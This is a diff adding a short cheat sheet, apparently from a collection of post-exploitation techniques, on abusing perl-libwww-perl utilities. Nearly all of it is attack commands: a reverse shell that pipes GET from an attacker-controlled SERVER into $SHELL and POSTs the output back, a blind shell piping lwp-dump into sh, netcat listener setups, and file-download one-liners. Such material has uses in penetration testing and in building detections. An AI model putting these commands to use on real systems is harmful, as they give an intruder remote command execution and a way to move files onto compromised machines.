@@ -1,0 +1,38 @@
+If perl-libwww-perl is installed
+----------------------------------------------
+* Reverse shell
+     using /usr/bin/GET and /usr/bin/POST
+     Commands are executed after ^C exit, command output will be sent to POST SERVER:PORT
+
+      [server]# nc -vl CMDP // cmd port
+        or
+      [server]# nc -vl CMDP < cmds.txt // cmd port, send commands in bulk
+      [server]# nc -vl COUT // cmd output port
+
+      [client]$ GET http://SERVER:CMDP | $SHELL | POST http://SERVER:COUT
+
+* Blind shell
+     lwp-dump program will get the resource indentified by the URL and then dump the response object to STDOUT.
+
+     [server]# ncat -vl PORT
+     [client]$ lwp-dump http://SERVER:PORT | sh
+
+       Commands will be executed after ^D, Example:
+       [server]# ncat -vl PORT
+
+        ls -la
+        id -a
+        echo test123
+        #
+        ^D
+
+* Download Files
+
+        [client]$ GET http://SERVER/file.sh > file.out
+        [client]$ echo|POST http://SERVER/path > file.out
+
+   -: lwp-download - Fetch large files from the web (scheme 'https' is not supported)
+
+       [client]$ lwp-download http://server/path/to/file:PORT /path/to/out.file
+
+
